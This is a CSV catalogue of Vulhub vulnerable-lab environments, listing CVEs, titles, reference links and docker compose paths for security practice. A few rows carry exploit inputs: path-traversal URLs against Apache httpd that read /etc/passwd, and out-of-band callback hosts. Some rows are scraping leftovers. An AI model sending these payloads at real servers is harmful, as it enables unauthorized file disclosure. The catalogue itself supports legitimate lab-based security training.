Name,CVE,Description,References,Path,Type,Startup,Vector
electron,CVE-2018-1000006,Electron Remote Code Execution Vulnerability（CVE-2018-1000006）,,https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006,docker-compose,docker compose up,remote
elfinder,CVE-2021-32682,elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682),"https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
https://xz.aliyun.com/t/10739
http://localhost.lan:8080/",https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682,docker-compose,docker compose up,remote
erlang,CVE-2025-32433,Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433),"https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd
https://github.com/ProDefense/CVE-2025-32433
https://datatracker.ietf.org/doc/html/rfc4254",https://github.com/vulhub/vulhub/tree/master/erlang/CVE-2025-32433,docker-compose,docker compose up,remote
fastjson,Unknown,Fastjson 1.2.47 Deserialization Remote Command Execution,"https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
https://www.freebuf.com/vuls/208339.html",unknown,docker-compose,docker compose up,remote
fastjson,Unknown,"Alert

This file is move to Here
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
fastjson,Unknown,Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349),"https://www.freebuf.com/vuls/208339.html
http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
http://your-ip:8090/",unknown,docker-compose,docker compose up,remote
ffmpeg,CVE-2017-9993,FFmpeg AVI Arbitrary File Read (CVE-2017-9993),"https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/
https://github.com/neex/ffmpeg-avi-m3u-xbin
https://www.anquanke.com/post/id/86337
https://github.com/neex/ffmpeg-avi-m3u-xbin",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2017-9993,docker-compose,docker compose up,remote
ffmpeg,CVE-2016-1897,FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898),"https://tttang.com/archive/465/
http://habrahabr.ru/company/mailru/blog/274855/
http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2016-1897,docker-compose,docker compose up,remote
flask,Unknown,Flask (Jinja2) Server-Side Template Injection,"https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates",unknown,docker-compose,docker compose up,remote
flink,CVE-2020-17518,Apache Flink Upload Path Traversal (CVE-2020-17518),"https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4
https://nvd.nist.gov/vuln/detail/CVE-2020-17518",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518,docker-compose,docker compose up,remote
flink,CVE-2020-17519,Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519),"https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801
https://nvd.nist.gov/vuln/detail/CVE-2020-17519",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519,docker-compose,docker compose up,remote
geoserver,CVE-2024-36401,GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401),"https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w
https://tttang.com/archive/1771/
https://github.com/Warxim/CVE-2022-41852",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401,docker-compose,docker compose up,remote
geoserver,CVE-2022-24816,GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042),"https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver
https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html
https://osgeo-org.atlassian.net/browse/GEOS-10458
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml
http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"">",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2022-24816,docker-compose,docker compose up,remote
geoserver,CVE-2021-40822,GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822),"https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
https://nvd.nist.gov/vuln/detail/CVE-2021-40822",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2021-40822,docker-compose,docker compose up,remote
geoserver,CVE-2023-25157,GeoServer OGC Filter SQL Injection (CVE-2023-25157),"https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
https://github.com/advisories/GHSA-7g5f-wrx8-5ccf",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157,docker-compose,docker compose up,remote
ghostscript,CVE-2018-16509,GhostScript Sandbox Bypass Command Execution (CVE-2018-16509),"http://seclists.org/oss-sec/2018/q3/142
https://bugs.chromium.org/p/project-zero/issues/detail?id=1640",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509,docker-compose,docker compose up,remote
ghostscript,CVE-2018-19475,GhostScript Sandbox Bypass Command Execution (CVE-2018-19475),"https://blog.semmle.com/ghostscript-CVE-2018-19475/
https://bugs.ghostscript.com/show_bug.cgi?id=700153",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-19475,docker-compose,docker compose up,remote
ghostscript,CVE-2019-6116,GhostScript Sandbox Bypass Command Execution (CVE-2019-6116),"https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2
https://www.anquanke.com/post/id/170255",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116,docker-compose,docker compose up,remote
git,CVE-2017-8386,GIT-SHELL Sandbox Bypass Leads to RCE (CVE-2017-8386),"https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/
https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html",https://github.com/vulhub/vulhub/tree/master/git/CVE-2017-8386,docker-compose,docker compose up,remote
gitea,Unknown,Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution,"https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html",unknown,docker-compose,docker compose up,remote
gitlab,CVE-2016-9086,GitLab Arbitrary File Disclosure (CVE-2016-9086),"https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/
https://hackerone.com/reports/178152
http://paper.seebug.org/104/",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2016-9086,docker-compose,docker compose up,remote
gitlab,CVE-2021-22205,GitLab Pre-Auth Remote Command Execution (CVE-2021-22205),"https://hackerone.com/reports/1154542
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2021-22205,docker-compose,docker compose up,remote
gitlist,CVE-2018-1000533,GitList 0.6.0 Remote Command Execution (CVE-2018-1000533),"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
https://www.exploit-db.com/exploits/44548
https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html",https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533,docker-compose,docker compose up,remote
gitlist,Unknown,"redirect to gitlist/CVE-2018-1000533
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
glassfish,CVE-2017-1000028,GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028),"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html",https://github.com/vulhub/vulhub/tree/master/glassfish/CVE-2017-1000028,docker-compose,docker compose up,remote
goahead,CVE-2021-42342,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2021-42342),"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg
http://target-ip:8080/cgi-bin/index",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2021-42342,docker-compose,docker compose up,remote
goahead,CVE-2017-17562,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562),"https://www.elttam.com.au/blog/goahead/
https://www.exploit-db.com/exploits/43360
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562,docker-compose,docker compose up,remote
gogs,CVE-2018-18925,Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925),"https://github.com/gogs/gogs/issues/5469
https://xz.aliyun.com/t/3168
https://www.anquanke.com/post/id/163575",https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925,docker-compose,docker compose up,remote
gradio,CVE-2023-51449,Gradio File Path Traversal (CVE-2023-51449),"https://github.com/gradio-app/gradio/pull/6833
https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2023-51449,docker-compose,docker compose up,remote
gradio,CVE-2024-1561,Gradio Arbitrary File Read (CVE-2024-1561),"https://github.com/gradio-app/gradio/pull/6884
https://nvd.nist.gov/vuln/detail/CVE-2024-1561",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2024-1561,docker-compose,docker compose up,remote
grafana,Unknown,Grafana Admin Portal SSRF,"https://github.com/RandomRobbieBF/grafana-ssrf
http://your-ip:3000
http://example.interact.sh/attack",unknown,docker-compose,docker compose up,remote
grafana,CVE-2021-43798,Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798),"https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
https://twitter.com/hacker_/status/1467880514489044993
https://nosec.org/home/detail/4914.html
https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw",https://github.com/vulhub/vulhub/tree/master/grafana/CVE-2021-43798,docker-compose,docker compose up,remote
h2database,CVE-2022-23221,H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221),"https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
https://github.com/h2database/h2database/releases/tag/version-2.1.210
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2022-23221,docker-compose,docker compose up,remote
h2database,CVE-2021-42392,H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392),"https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e
https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037
https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2021-42392,docker-compose,docker compose up,remote
h2database,CVE-2018-10054,H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054),"https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
https://www.exploit-db.com/exploits/45506
https://github.com/h2database/h2database/issues/1225
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2018-10054,docker-compose,docker compose up,remote
hadoop,Unknown,Hadoop YARN ResourceManager Unauthorized Access,"http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html",unknown,docker-compose,docker compose up,remote
hertzbeat,CVE-2024-42323,Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323),"https://forum.butian.net/article/612
https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md",https://github.com/vulhub/vulhub/tree/master/hertzbeat/CVE-2024-42323,docker-compose,docker compose up,remote
httpd,Unknown,"[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
httpd,CVE-2021-42013,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013),"https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024
http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-42013,docker-compose,docker compose up,remote
httpd,CVE-2021-41773,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773),"https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344
http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773,docker-compose,docker compose up,remote
httpd,CVE-2021-40438,Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438),"https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-40438,docker-compose,docker compose up,remote
httpd,Unknown,Apache HTTP Server SSI Remote Command Execution,,unknown,docker-compose,docker compose up,remote
httpd,CVE-2017-15715,Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715),"https://httpd.apache.org/security/vulnerabilities_24.html
https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715,docker-compose,docker compose up,remote
httpd,Unknown,Apache HTTPD Multiple Extension Parsing Vulnerability,,unknown,docker-compose,docker compose up,remote
hugegraph,CVE-2024-27348,Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348),"https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
https://github.com/Zeyad-Azima/CVE-2024-27348",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-27348,docker-compose,docker compose up,remote
hugegraph,CVE-2024-43441,Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441),"https://github.com/advisories/GHSA-f697-gm3h-xrf9
https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-43441,docker-compose,docker compose up,remote
imagemagick,CVE-2022-44268,ImageMagick Arbitrary File Disclosure (CVE-2022-44268),"https://www.metabaseq.com/imagemagick-zero-days/
https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268,docker-compose,docker compose up,remote
imagemagick,CVE-2020-29599,ImageMagick Shell Injection via PDF Password (CVE-2020-29599),https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html,https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2020-29599,docker-compose,docker compose up,remote
imagemagick,Unknown,"Page Moved

The ""imagetragick"" issue is moved to CVE-2016-3714
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
imagemagick,CVE-2016-3714,ImageMagick Imagetragick Command Injection (CVE-2016–3714),"https://imagetragick.com
https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
https://github.com/ImageTragick/PoCs",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2016-3714,docker-compose,docker compose up,remote
influxdb,CVE-2019-20933,InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933),"https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
https://github.com/influxdata/influxdb/issues/12927
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings
https://jwt.io/",https://github.com/vulhub/vulhub/tree/master/influxdb/CVE-2019-20933,docker-compose,docker compose up,remote
ingress-nginx,CVE-2025-1974,Kubernetes Ingress-NGINX Unauthenticated Remote Code Execution (CVE-2025-1974),"https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
https://github.com/yoshino-s/CVE-2025-1974
https://github.com/Clifford-prog/IngressNightmare-PoC
https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425
https://localhost:30443/networking/v1/ingresses
http://localhost:30080/fake/addr",https://github.com/vulhub/vulhub/tree/master/ingress-nginx/CVE-2025-1974,docker-compose,docker compose up,remote
jackson,CVE-2017-7525,Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525),"http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd",https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525,docker-compose,docker compose up,remote
java,Unknown,Java RMI Codebase Remote Code Execution,"https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html
https://paper.seebug.org/1091/",unknown,docker-compose,docker compose up,remote
java,Unknown,Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution,"https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
https://github.com/frohoff/ysoserial",unknown,docker-compose,docker compose up,remote
java,Unknown,Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass,"https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
https://github.com/wh1t3p1g/ysoserial
http://xxxxx.burpcollaborator.net""",unknown,docker-compose,docker compose up,remote
jboss,CVE-2017-12149,JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149),"https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
https://access.redhat.com/security/cve/cve-2017-12149
http://www.jackson-t.ca/runtime-exec-payloads.html",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149,docker-compose,docker compose up,remote
jboss,Unknown,JBoss JMXInvokerServlet Deserialization Remote Code Execution,"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://www.seebug.org/vuldb/ssvid-89723
http://www.freebuf.com/sectool/88908.html
https://paper.seebug.org/312/",unknown,docker-compose,docker compose up,remote
jboss,CVE-2017-7504,JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504),"https://github.com/joaomatosf/JavaDeserH2HC
https://www.youtube.com/watch?v=jVMr4eeJ2Po
http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-7504,docker-compose,docker compose up,remote
jenkins,CVE-2024-23897,Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897),"https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897,docker-compose,docker compose up,remote
